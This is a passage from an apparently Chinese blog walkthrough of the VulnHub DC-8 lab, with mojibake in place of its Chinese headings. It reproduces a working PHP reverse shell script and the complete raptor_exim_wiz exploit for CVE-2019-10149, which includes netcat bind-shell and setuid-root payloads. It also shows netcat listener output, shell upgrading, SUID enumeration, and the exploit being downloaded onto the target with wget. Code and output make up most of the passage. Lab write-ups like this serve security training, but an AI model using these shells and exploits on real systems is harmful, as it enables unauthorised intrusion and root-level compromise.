class="line"></span><br><span class="line">//</span><br><span class="line">// Do the reverse shell...</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">// Open reverse connection</span><br><span class="line"><span class="variable">$sock</span> = fsockopen(<span class="variable">$ip</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, 30);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$sock</span>) &#123;</span><br><span class="line">        printit(<span class="string">&quot;<span class="variable">$errstr</span> (<span class="variable">$errno</span>)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Spawn shell process</span><br><span class="line"><span class="variable">$descriptorspec</span> = array(</span><br><span class="line">   0 =&gt; array(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),  // stdin is a pipe that the child will <span class="built_in">read</span> from</span><br><span class="line">   1 =&gt; array(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>),  // stdout is a pipe that the child will write to</span><br><span class="line">   2 =&gt; array(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>)   // stderr is a pipe that the child will write to</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$process</span> = proc_open(<span class="variable">$shell</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_resource(<span class="variable">$process</span>)) &#123;</span><br><span class="line">        printit(<span class="string">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Set everything to non-blocking</span><br><span class="line">// Reason: Occsionally reads will block, even though stream_select tells us they won<span class="string">&#x27;t</span></span><br><span class="line"><span class="string">stream_set_blocking($pipes[0], 0);</span></span><br><span class="line"><span class="string">stream_set_blocking($pipes[1], 0);</span></span><br><span class="line"><span class="string">stream_set_blocking($pipes[2], 0);</span></span><br><span class="line"><span class="string">stream_set_blocking($sock, 0);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">printit(&quot;Successfully opened reverse shell to $ip:$port&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">while (1) &#123;</span></span><br><span class="line"><span class="string">        // Check for end of TCP connection</span></span><br><span class="line"><span class="string">        if (feof($sock)) &#123;</span></span><br><span class="line"><span class="string">                printit(&quot;ERROR: Shell connection terminated&quot;);</span></span><br><span class="line"><span class="string">                break;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        // Check for end of STDOUT</span></span><br><span class="line"><span class="string">        if (feof($pipes[1])) &#123;</span></span><br><span class="line"><span class="string">                printit(&quot;ERROR: Shell process terminated&quot;);</span></span><br><span class="line"><span class="string">                break;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        // Wait until a command is end down $sock, or some</span></span><br><span class="line"><span class="string">        // command output is available on STDOUT or STDERR</span></span><br><span class="line"><span class="string">        $read_a = array($sock, $pipes[1], $pipes[2]);</span></span><br><span class="line"><span class="string">        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        // If we can read from the TCP socket, send</span></span><br><span class="line"><span class="string">        // data to process&#x27;</span>s STDIN</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$sock</span>, <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;SOCK READ&quot;</span>);</span><br><span class="line">                <span class="variable">$input</span> = fread(<span class="variable">$sock</span>, <span class="variable">$chunk_size</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;SOCK: <span class="variable">$input</span>&quot;</span>);</span><br><span class="line">                fwrite(<span class="variable">$pipes</span>[0], <span class="variable">$input</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // If we can <span class="built_in">read</span> from the process<span class="string">&#x27;s STDOUT</span></span><br><span class="line"><span class="string">        // send data down tcp connection</span></span><br><span class="line"><span class="string">        if (in_array($pipes[1], $read_a)) &#123;</span></span><br><span class="line"><span class="string">                if ($debug) printit(&quot;STDOUT READ&quot;);</span></span><br><span class="line"><span class="string">                $input = fread($pipes[1], $chunk_size);</span></span><br><span class="line"><span class="string">                if ($debug) printit(&quot;STDOUT: $input&quot;);</span></span><br><span class="line"><span class="string">                fwrite($sock, $input);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        // If we can read from the process&#x27;</span>s STDERR</span><br><span class="line">        // send data down tcp connection</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$pipes</span>[2], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;STDERR READ&quot;</span>);</span><br><span class="line">                <span class="variable">$input</span> = fread(<span class="variable">$pipes</span>[2], <span class="variable">$chunk_size</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;STDERR: <span class="variable">$input</span>&quot;</span>);</span><br><span class="line">                fwrite(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fclose(<span class="variable">$sock</span>);</span><br><span class="line">fclose(<span class="variable">$pipes</span>[0]);</span><br><span class="line">fclose(<span class="variable">$pipes</span>[1]);</span><br><span class="line">fclose(<span class="variable">$pipes</span>[2]);</span><br><span class="line">proc_close(<span class="variable">$process</span>);</span><br><span class="line"></span><br><span class="line">// Like <span class="built_in">print</span>, but does nothing <span class="keyword">if</span> we<span class="string">&#x27;ve daemonised ourself</span></span><br><span class="line"><span class="string">// (I can&#x27;</span>t figure out how to redirect STDOUT like a proper daemon)</span><br><span class="line"><span class="keyword">function</span> printit (<span class="variable">$string</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$daemon</span>) &#123;</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;<span class="variable">$string</span>\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><code>ç¼–è¾‘</code></p><img src="/2020/08/31/DC-8/image-20200831095432503.png" class><p><code>ä¿å­˜</code></p><img src="/2020/08/31/DC-8/image-20200831095500070.png" class><p><code>kaliç›‘å¬</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 1234</span></span><br><span class="line">listening on [any] 1234 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>æäº¤è¡¨å•</code></p><img src="/2020/08/31/DC-8/image-20200831095803786.png" class><p><code>kali get shell</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 1234</span></span><br><span class="line">listening on [any] 1234 ...</span><br><span class="line">connect to [192.168.1.6] from (UNKNOWN) [192.168.1.3] 38376</span><br><span class="line">Linux dc-8 4.9.0-4-amd64 <span class="comment">#1 SMP Debian 4.9.51-1 (2017-09-28) x86_64 GNU/Linux</span></span><br><span class="line"> 11:58:10 up  1:26,  0 users,  load average: 0.00, 0.00, 0.00</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$</span></span><br></pre></td></tr></table></figure><p><code>å‡çº§shell</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">www-data@dc-8:/$ </span><br><span class="line"></span><br><span class="line">www-data@dc-8:/$</span><br></pre></td></tr></table></figure><p><code>å‡çº§ä¸ºäº¤äº’shell</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-8:/$ ^Z</span><br><span class="line">[1]+  å·²åœæ­¢               nc -nvlp 1234</span><br><span class="line">root@JIYE:~<span class="comment"># stty raw -echo</span></span><br><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 1234</span></span><br><span class="line"></span><br><span class="line">www-data@dc-8:/$ </span><br><span class="line">www-data@dc-8:/$ whoami</span><br><span class="line">www-data</span><br><span class="line">www-data@dc-8:/$ <span class="built_in">pwd</span></span><br><span class="line">/</span><br><span class="line">www-data@dc-8:/$ </span><br></pre></td></tr></table></figure><h2 id="0x10-ææƒ"><a href="#0x10-ææƒ" class="headerlink" title="0x10.ææƒ"></a>0x10.ææƒ</h2><p><code>SUIDææƒï¼Œexim4å…·æœ‰SUIDæ ‡è¯†</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-8:/$ find / -perm -4000 2&gt;/dev/null </span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">www-data@dc-8:/$</span><br></pre></td></tr></table></figure><p><code>æŸ¥çœ‹exim4ç‰ˆæœ¬ï¼Œä¸º4.89</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-8:/$ exim4 --<span class="built_in">help</span></span><br><span class="line">Exim is a Mail Transfer Agent. It is normally called by Mail User Agents,</span><br><span class="line">not directly from a shell <span class="built_in">command</span> line. Options and/or arguments control</span><br><span class="line">what it does when called. For a list of options, see the Exim documentation.</span><br><span class="line">www-data@dc-8:/$</span><br><span class="line">www-data@dc-8:/$ exim4 --version</span><br><span class="line">Exim version 4.89 <span class="comment">#2 built 14-Jun-2017 05:03:07</span></span><br><span class="line">Copyright (c) University of Cambridge, 1995 - 2017</span><br><span class="line">(c) The Exim Maintainers and contributors <span class="keyword">in</span> ACKNOWLEDGMENTS file, 2007 - 2017</span><br><span class="line">Berkeley DB: Berkeley DB 5.3.28: (September  9, 2013)</span><br><span class="line">Support <span class="keyword">for</span>: crypteq iconv() IPv6 GnuTLS move_frozen_messages DKIM DNSSEC Event OCSP PRDR SOCKS TCP_Fast_Open</span><br><span class="line">Lookups (built-in): lsearch wildlsearch nwildlsearch iplsearch cdb dbm dbmjz dbmnz dnsdb dsearch nis nis0 passwd</span><br><span class="line">Authenticators: cram_md5 plaintext</span><br><span class="line">Routers: accept dnslookup ipliteral manualroute queryprogram redirect</span><br><span class="line">Transports: appendfile/maildir/mailstore autoreply lmtp pipe smtp</span><br><span class="line">Fixed never_users: 0</span><br><span class="line">Configure owner: 0:0</span><br><span class="line">Size of off_t: 8</span><br><span class="line">Configuration file is /var/lib/exim4/config.autogenerated</span><br><span class="line">www-data@dc-8:/$</span><br></pre></td></tr></table></figure><p><code>Google exim4 4.89 exploit</code></p><img src="/2020/08/31/DC-8/image-20200831101735507.png" class><p><code>å¤åˆ¶æºç </code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc8<span class="comment"># cat exim.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># raptor_exim_wiz - &quot;The Return of the WIZard&quot; LPE exploit</span></span><br><span class="line"><span class="comment"># Copyright (c) 2019 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># A flaw was found in Exim versions 4.87 to 4.91 (inclusive). </span></span><br><span class="line"><span class="comment"># Improper validation of recipient address in deliver_message() </span></span><br><span class="line"><span class="comment"># function in /src/deliver.c may lead to remote command execution.</span></span><br><span class="line"><span class="comment"># (CVE-2019-10149)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This is a local privilege escalation exploit for &quot;The Return </span></span><br><span class="line"><span class="comment"># of the WIZard&quot; vulnerability reported by the Qualys Security </span></span><br><span class="line"><span class="comment"># Advisory team.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Credits:</span></span><br><span class="line"><span class="comment"># Qualys Security Advisory team (kudos for your amazing research!)</span></span><br><span class="line"><span class="comment"># Dennis &#x27;dhn&#x27; Herrmann (/dev/tcp technique)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Usage (setuid method):</span></span><br><span class="line"><span class="comment"># $ id</span></span><br><span class="line"><span class="comment"># uid=1000(raptor) gid=1000(raptor) groups=1000(raptor) [...]</span></span><br><span class="line"><span class="comment"># $ ./raptor_exim_wiz -m setuid</span></span><br><span class="line"><span class="comment"># Preparing setuid shell helper...</span></span><br><span class="line"><span class="comment"># Delivering setuid payload...</span></span><br><span class="line"><span class="comment"># [...]</span></span><br><span class="line"><span class="comment"># Waiting 5 seconds...</span></span><br><span class="line"><span class="comment"># -rwsr-xr-x 1 root raptor 8744 Jun 16 13:03 /tmp/pwned</span></span><br><span class="line"><span class="comment"># # id</span></span><br><span class="line"><span class="comment"># uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Usage (netcat method):</span></span><br><span class="line"><span class="comment"># $ id</span></span><br><span class="line"><span class="comment"># uid=1000(raptor) gid=1000(raptor) groups=1000(raptor) [...]</span></span><br><span class="line"><span class="comment"># $ ./raptor_exim_wiz -m netcat</span></span><br><span class="line"><span class="comment"># Delivering netcat payload...</span></span><br><span class="line"><span class="comment"># Waiting 5 seconds...</span></span><br><span class="line"><span class="comment"># localhost [127.0.0.1] 31337 (?) open</span></span><br><span class="line"><span class="comment"># id</span></span><br><span class="line"><span class="comment"># uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Vulnerable platforms:</span></span><br><span class="line"><span class="comment"># Exim 4.87 - 4.91</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Tested against:</span></span><br><span class="line"><span class="comment"># Exim 4.89 on Debian GNU/Linux 9 (stretch) [exim-4.89.tar.xz]</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">METHOD=<span class="string">&quot;setuid&quot;</span> <span class="comment"># default method</span></span><br><span class="line">PAYLOAD_SETUID=<span class="string">&#x27;$&#123;run&#123;\x2fbin\x2fsh\t-c\t\x22chown\troot\t\x2ftmp\x2fpwned\x3bchmod\t4755\t\x2ftmp\x2fpwned\x22&#125;&#125;@localhost&#x27;</span></span><br><span class="line">PAYLOAD_NETCAT=<span class="string">&#x27;$&#123;run&#123;\x2fbin\x2fsh\t-c\t\x22nc\t-lp\t31337\t-e\t\x2fbin\x2fsh\x22&#125;&#125;@localhost&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># usage instructions</span></span><br><span class="line"><span class="keyword">function</span> usage()</span><br><span class="line">&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$0</span> [-m METHOD]&quot;</span></span><br><span class="line">        <span class="built_in">echo</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;-m setuid : use the setuid payload (default)&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;-m netcat : use the netcat payload&quot;</span></span><br><span class="line">        <span class="built_in">echo</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload delivery</span></span><br><span class="line"><span class="keyword">function</span> exploit()</span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment"># connect to localhost:25</span></span><br><span class="line">        <span class="built_in">exec</span> 3&lt;&gt;/dev/tcp/localhost/25</span><br><span class="line"></span><br><span class="line">        <span class="comment"># deliver the payload</span></span><br><span class="line">        <span class="built_in">read</span> -u 3 &amp;&amp; <span class="built_in">echo</span> <span class="variable">$REPLY</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;helo localhost&quot;</span> &gt;&amp;3</span><br><span class="line">        <span class="built_in">read</span> -u 3 &amp;&amp; <span class="built_in">echo</span> <span class="variable">$REPLY</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;mail from:&lt;&gt;&quot;</span> &gt;&amp;3</span><br><span class="line">        <span class="built_in">read</span> -u 3 &amp;&amp; <span class="built_in">echo</span> <span class="variable">$REPLY</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;rcpt to:&lt;<span class="variable">$PAYLOAD</span>&gt;&quot;</span> &gt;&amp;3</span><br><span class="line">        <span class="built_in">read</span> -u 3 &amp;&amp; <span class="built_in">echo</span> <span class="variable">$REPLY</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;data&quot;</span> &gt;&amp;3</span><br><span class="line">        <span class="built_in">read</span> -u 3 &amp;&amp; <span class="built_in">echo</span> <span class="variable">$REPLY</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..31&#125;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;Received: <span class="variable">$i</span>&quot;</span> &gt;&amp;3</span><br><span class="line">        <span class="keyword">done</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;.&quot;</span> &gt;&amp;3</span><br><span class="line">        <span class="built_in">read</span> -u 3 &amp;&amp; <span class="built_in">echo</span> <span class="variable">$REPLY</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;quit&quot;</span> &gt;&amp;3</span><br><span class="line">        <span class="built_in">read</span> -u 3 &amp;&amp; <span class="built_in">echo</span> <span class="variable">$REPLY</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># print banner</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;raptor_exim_wiz - &quot;The Return of the WIZard&quot; LPE exploit&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;Copyright (c) 2019 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;&#x27;</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># parse command line</span></span><br><span class="line"><span class="keyword">while</span> [ ! -z <span class="string">&quot;<span class="variable">$1</span>&quot;</span> ]; <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line">                -m) <span class="built_in">shift</span>; METHOD=<span class="string">&quot;<span class="variable">$1</span>&quot;</span>; <span class="built_in">shift</span>;;</span><br><span class="line">                * ) usage</span><br><span class="line">                ;;</span><br><span class="line">        <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="variable">$METHOD</span> ]; <span class="keyword">then</span></span><br><span class="line">        usage</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setuid method</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$METHOD</span> = <span class="string">&quot;setuid&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># prepare a setuid shell helper to circumvent bash checks</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Preparing setuid shell helper...&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;main()&#123;setuid(0);setgid(0);system(\&quot;/bin/sh\&quot;);&#125;&quot;</span> &gt;/tmp/pwned.c</span><br><span class="line">        gcc -o /tmp/pwned /tmp/pwned.c 2&gt;/dev/null</span><br><span class="line">        <span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;Problems compiling setuid shell helper, check your gcc.&quot;</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;Falling back to the /bin/sh method.&quot;</span></span><br><span class="line">                cp /bin/sh /tmp/pwned</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">        <span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># select and deliver the payload</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Delivering <span class="variable">$METHOD</span> payload...&quot;</span></span><br><span class="line">        PAYLOAD=<span class="variable">$PAYLOAD_SETUID</span></span><br><span class="line">        exploit</span><br><span class="line">        <span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># wait for the magic to happen and spawn our shell</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Waiting 5 seconds...&quot;</span></span><br><span class="line">        sleep 5</span><br><span class="line">        ls -l /tmp/pwned</span><br><span class="line">        /tmp/pwned</span><br><span class="line"></span><br><span class="line"><span class="comment"># netcat method</span></span><br><span class="line"><span class="keyword">elif</span> [ <span class="variable">$METHOD</span> = <span class="string">&quot;netcat&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># select and deliver the payload</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Delivering <span class="variable">$METHOD</span> payload...&quot;</span></span><br><span class="line">        PAYLOAD=<span class="variable">$PAYLOAD_NETCAT</span></span><br><span class="line">        exploit</span><br><span class="line">        <span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># wait for the magic to happen and spawn our shell</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Waiting 5 seconds...&quot;</span></span><br><span class="line">        sleep 5</span><br><span class="line">        nc -v 127.0.0.1 31337</span><br><span class="line"></span><br><span class="line"><span class="comment"># print help</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        usage</span><br><span class="line">fid</span><br><span class="line">root@JIYE:~/vulnhub/dc8<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><code>ä¸Šä¼ exp</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc8<span class="comment"># ls</span></span><br><span class="line">exim.sh  nmap.demo  nmap.sP  re.php  user.txt</span><br><span class="line">root@JIYE:~/vulnhub/dc8<span class="comment"># python -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line">192.168.1.3 - - [30/Aug/2020 22:26:17] <span class="string">&quot;GET /exim.exp HTTP/1.1&quot;</span> 200 -</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-8:/tmp$ wget http://192.168.1.6/exim.sh</span><br><span class="line">--2020-08-31 12:26:18--  http://192.168.1.6/exim.sh</span><br><span class="line">Connecting to 192.168.1.6:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3547 (3.5K) [application/octet-stream]</span><br><span class="line">Saving to: <span class="string">&#x27;exim.exp&#x27;</span></span><br><span class="line"></span><br><span class="line">exim.exp            100%[===================&gt;]   3.46K  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2020-08-31 12:26:18 (111 MB/s) - <span class="string">&#x27;exim.exp&#x27;</span> saved [3547/3547]</span><br><span class="line"></span><br><span class="line">www-data@dc-8:/tmp$ ls</span><br><span class="line">exim.sh</span><br></pre></td></tr></table></figure><p><code>æ‰§è¡Œ</code></p><figure class="highlight bash"><table><tr><td 